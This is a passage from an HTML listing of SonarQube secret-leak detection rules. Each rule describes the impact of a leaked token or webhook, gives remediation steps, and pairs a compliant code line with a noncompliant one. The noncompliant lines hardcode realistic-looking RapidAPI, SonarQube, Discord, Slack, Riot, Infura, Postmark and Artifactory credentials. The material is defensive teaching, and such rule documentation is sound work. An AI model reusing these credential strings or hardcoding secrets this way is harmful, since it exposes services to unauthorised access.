<p>Due to this vulnerability, malware can be stored and spread, both to users of the service and to other potential targets.<br> A malware depends on
the attacker’s intentions, as the following examples show:</p>
<ul>
  <li> Cryptojacking malware, whose goal is to "mine" cryptocurrencies on the affected computers or servers. </li>
  <li> Spyware that spies out sensitive information from victims. </li>
</ul>
<p>In the worst case, malware can cause the target systems to be completely compromised and allow attackers to infiltrate the systems.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("api_token", "7299363101:AAWJlilLyeMaKgTTrrfsyrtxDqqI-cdI-TF") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("api_token", System.getenv("API_TOKEN"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6700">
              secrets:S6700
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>A RapidAPI key is a unique identifier that allows you to access and use APIs provided by RapidAPI. This key is used to track your API usage, manage
your subscriptions, and ensure that you have the necessary permissions to access the APIs you are using. One RapidAPI key can be used to authenticate
against a set of multiple other third-party services, depending on the key entitlement.</p>
<p>If a RapidAPI key leaks to an unintended audience, it can have several potential consequences. Especially, attackers may use the leaked key to
access and utilize the APIs associated with that key without permission. This can result in unauthorized usage of API services, potentially leading to
misuse, abuse, or excessive consumption of resources.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p>RapidAPI services include an audit trail feature that can be used to audit malicious use of the compromised key.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("rapidapi_key", "6f1bbe24b9mshcbb5030202794a4p18f7d0jsndd55ab0f981d") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("rapidapi_key", System.getenv("rapidapi_key"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
<h3>Documentation</h3>
<ul>
  <li> RapidAPI Documentation - <a href="https://docs.rapidapi.com/docs/keys-and-key-rotation#creating-or-rotating-a-rapid-api-key">Creating or
  rotating a Rapid API key</a> </li>
  <li> RapidAPI Documentation - <a href="https://docs.rapidapi.com/docs/org-audit-trails">Audit Trails</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6702">
              secrets:S6702
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>A SonarQube token is a unique key that serves as an authentication mechanism for accessing the SonarQube platform’s APIs. It is used to securely
authenticate and authorize external tools or services to interact with SonarQube.</p>
<p>Tokens are typically generated for specific users or applications and can be configured with different levels of access permissions. By using a
token, external tools or services can perform actions such as analyzing code, retrieving analysis results, creating projects, or managing quality
profiles within SonarQube.</p>
<p>If a SonarQube token leaks to an unintended audience, it can pose a security risk to the SonarQube instance and the associated projects. Attackers
may use the leaked token to gain unauthorized access to the SonarQube instance. They can potentially view sensitive information, modify project
settings, or perform other dangerous actions.</p>
<p>Additionally, attackers with access to a token can modify code analysis results. This can lead to false positives or negatives in the analysis,
compromising the accuracy and reliability of the platform.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p>The SonarQube audit log can be downloaded from the product web interface and can be used to audit the malicious use of the compromised key. This
feature is available starting with SonarQube Enterprise Edition.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("sonar_secret", "squ_b4556a16fa2d28519d2451a911d2e073024010bc") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("sonar_secret", System.getenv("SONAR_SECRET"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
<h3>Documentation</h3>
<ul>
  <li> SonarQube Documentation - <a
  href="https://docs.sonarsource.com/sonarqube/latest/user-guide/user-account/generating-and-using-tokens/">Generating and using tokens</a> </li>
  <li> SonarQube Documentation - <a href="https://docs.sonarsource.com/sonarqube/latest/instance-administration/security/">Security</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6708">
              secrets:S6708
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>The Discord webhook URL grants access to a channel in your server, represented by a bot. A plethora of permissions can be specified in the
<code>Bot Permissions</code> pane.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>
<h4>Compromise of sensitive personal data</h4>
<p>This kind of service is often used to exchange information that could include personal information, chat logs, and other private data that users
have shared on the platform. This is called <a href="https://gdpr.eu/eu-gdpr-personal-data/"><code>Personally Identifiable Information</code></a>.<br>
The leaked app key could provide a gateway for unauthorized individuals to access and misuse this data, compromising the privacy and safety of the
application users.</p>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If this kind of sensitive personal data
gets leaked, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h4>Phishing and spam</h4>
<p>An attacker can use this webhook to spam users or lure them into links to a malicious domain controlled by the attacker.</p>
<p>Spam can cause users to be exposed to the following:</p>
<ul>
  <li> Unsolicited, inappropriate content, such as pornographic material </li>
  <li> Fraudulent attempts to trick users into sending information or money </li>
  <li> Abusive or hateful statements </li>
  <li> False advertising or fraudulent claims </li>
</ul>
<p>Once a user has been phished on a legitimate-seeming third-party website, an attacker can collect the user’s credentials, bypass multi-factor
authentication (MFA), and take over the user’s account on the trusted website.</p>
<h4>Malware distribution</h4>
<p>Due to this vulnerability, malware can be stored and spread, both to users of the service and to other potential targets.<br> A malware depends on
the attacker’s intentions, as the following examples show:</p>
<ul>
  <li> Cryptojacking malware, whose goal is to "mine" cryptocurrencies on the affected computers or servers. </li>
  <li> Spyware that spies out sensitive information from victims. </li>
</ul>
<p>In the worst case, malware can cause the target systems to be completely compromised and allow attackers to infiltrate the systems.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("discord_webhook_url", "https://discord.com/api/webhooks/1143503308481384529/SBkGFYyl6njbyg_DJwhP2x5s4XAzd8Ll5CZQ7HG4xfDRJhOTAIlb0UiPL4ykOZQNIHpd") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("discord_webhook_url", System.getenv("DISCORD_WEBHOOK_URL"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6704">
              secrets:S6704
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Riot API keys are used to access the Riot Games API, which provides developers with programmatic access to various data and services related to
Riot Games' products, such as League of Legends. These API keys are used to authenticate and authorize requests made to the API, allowing developers
to retrieve game data, player statistics, match history, and other related information.</p>
<p>If a Riot API key is leaked to an unintended audience, it can have significant consequences. One of the main risks is unauthorized access. The
unintended audience may exploit the leaked API key to gain entry to the Riot Games API. This can result in the unauthorized retrieval of sensitive
data and misuse of services provided by the API. It poses a serious security threat as it allows individuals to access information that they should
not have access to, potentially compromising the privacy and integrity of the data.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("api_key", "RGAPI-924549e3-31a9-406e-9e92-25ed41206dce") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("api_key", System.getenv("API_KEY"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6783">
              secrets:S6783
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>
<h4>Disclosure of blockchain data</h4>
<p>The leaked key can be used to query APIs of blockchain services and access sensitive information stored in the service metadata. This may include
user identities and other sensitive data.<br> Such disclosure compromises user privacy and confidentiality.</p>
<h4>Breach of trust in non-repudiation and disruption of the audit trail</h4>
<p>When such a secret is compromised, malicious actors might have the possibility to send malicious event objects, causing discrepancies in the audit
trail. This can make it difficult to trace and verify the sequence of events, impacting the ability to investigate and identify unauthorized or
fraudulent activity.</p>
<p>All in all, this can lead to problems in proving the validity of transactions or actions performed, potentially leading to disputes and legal
complications.</p>
<h4>Financial loss</h4>
<p>Since this secret is used to process transaction-related operations, financial loss may also occur if transaction-related objects are corrupted or
the account is tampered with.<br> This can range from indirect losses to direct unauthorized transfers of funds that can lead to bankruptcy or
impoverishment of individuals.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("infura_api_key", "https://mainnet.infura.io/v3/f6fc4aa25abb16e901876269d01f2ec5") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("infura_api_key", System.getenv("INFURA_API_KEY"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6910">
              secrets:S6910
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Postmark server tokens are used to authenticate requests to the Postmark API. When a request is made to the Postmark API, the server token is
included in the header of the request. This process enables Postmark to confirm that the request originates from a trusted source and should be
processed accordingly.</p>
<p>These tokens are sensitive because they provide full access to all features and data on a specific server in Postmark.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>
<h4>Phishing and spam</h4>
<p>An attacker can use this token to spam users or lure them into links to a malicious domain controlled by the attacker.</p>
<p>Spam can cause users to be exposed to the following:</p>
<ul>
  <li> Unsolicited, inappropriate content, such as pornographic material </li>
  <li> Fraudulent attempts to trick users into sending information or money </li>
  <li> Abusive or hateful statements </li>
  <li> False advertising or fraudulent claims </li>
</ul>
<p>Once a user has been phished on a legitimate-seeming third-party website, an attacker can collect the user’s credentials, bypass multi-factor
authentication (MFA), and take over the user’s account on the trusted website.</p>
<h4>Malware distribution</h4>
<p>Due to this vulnerability, malware can be stored and spread, both to users of the service and to other potential targets.<br> A malware depends on
the attacker’s intentions, as the following examples show:</p>
<ul>
  <li> Cryptojacking malware, whose goal is to "mine" cryptocurrencies on the affected computers or servers. </li>
  <li> Spyware that spies out sensitive information from victims. </li>
</ul>
<p>In the worst case, malware can cause the target systems to be completely compromised and allow attackers to infiltrate the systems.</p>
<h4>Account termination</h4>
<p>Unauthorized access to mailing service API keys can also result in resource abuse. Attackers can exploit the API keys to send a large volume of
spam emails or perform other resource-intensive operations, causing a significant strain on the mailing service provider’s infrastructure.</p>
<p>The service provider, being vigilant about such activities, may flag your account and take action against it. This could lead to the suspension or
termination of the compromised account, thus causing significant inconvenience and potential loss of communication with your customers or
partners.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("X-Postmark-Server-Token", "89d36b44-4c54-4623-91d9-b61f29b702f8") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("X-Postmark-Server-Token", System.getenv("POSTMARK_SERVER_TOKEN"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6713">
              secrets:S6713
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Slack Incoming Webhook URLs have write-only access to a channel: They can only post messages.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>
<h4>Phishing and spam</h4>
<p>An attacker can use this webhook to spam users or lure them into links to a malicious domain controlled by the attacker.</p>
<p>Spam can cause users to be exposed to the following:</p>
<ul>
  <li> Unsolicited, inappropriate content, such as pornographic material </li>
  <li> Fraudulent attempts to trick users into sending information or money </li>
  <li> Abusive or hateful statements </li>
  <li> False advertising or fraudulent claims </li>
</ul>
<p>Once a user has been phished on a legitimate-seeming third-party website, an attacker can collect the user’s credentials, bypass multi-factor
authentication (MFA), and take over the user’s account on the trusted website.</p>
<h4>Malware distribution</h4>
<p>Due to this vulnerability, malware can be stored and spread, both to users of the service and to other potential targets.<br> A malware depends on
the attacker’s intentions, as the following examples show:</p>
<ul>
  <li> Cryptojacking malware, whose goal is to "mine" cryptocurrencies on the affected computers or servers. </li>
  <li> Spyware that spies out sensitive information from victims. </li>
</ul>
<p>In the worst case, malware can cause the target systems to be completely compromised and allow attackers to infiltrate the systems.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("slack_webhook_url", "https://hooks.slack.com/services/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") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("slack_webhook_url", System.getenv("SLACK_WEBHOOK_URL"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6752">
              secrets:S6752
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<p>Attackers with access to an Artifactory API key will be able to use this API with all the permissions the corresponding user has been granted
with.</p>
<h3>What is the potential impact?</h3>
<p>The consequences vary depending on the compromised account entitlement but can range from proprietary information leaks to severe supply chain
attacks.</p>
<h4>Compromise of sensitive data</h4>
<p>If the affected service is used to store or process personally identifiable information or other sensitive data, attackers knowing an
authentication secret could be able to access it. Depending on the type of data that is compromised, it could lead to privacy violations, identity
theft, financial loss, or other negative outcomes.</p>
<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>
<p>In the case of Artifactory repositories, if they contain private code or software, attackers will be able to steal those. They could use this
software for their own use, to look for further exploitable vulnerability, or disclose it publicly, with or without asking for a ransom.</p>
<h4>Supply chain attacks</h4>
<p>If the leaked secret gives an attacker the ability to publish code to private packages or repositories under the name of the organization, then
there may exist grave consequences beyond the compromise of source code. The attacker may inject malware, backdoors, or other harmful code into these
private repositories.</p>
<p>This can cause further security breaches inside the organization, but will also affect clients if the malicious code gets added to any products.
Distributing code that (unintentionally) contains backdoors or malware can lead to widespread security vulnerabilities, reputational damage, and
potential legal liabilities.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("artifactory_token", "AKCp8vLnDPZeVA29WylUNdaT54Pg2E9rx8gJWfbPCw2Wsb0UCAEmimIPFscGbJPYEUhXVBCRQ") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("artifactory_token", System.getenv("ARTIFACTORY_TOKEN"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6710">
              secrets:S6710
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>A FCM API key leak is particularly severe if the affected key has administrative privileges: The range of topics to which an attacker can subscribe
and send messages is much larger than with normal privileges.</p>
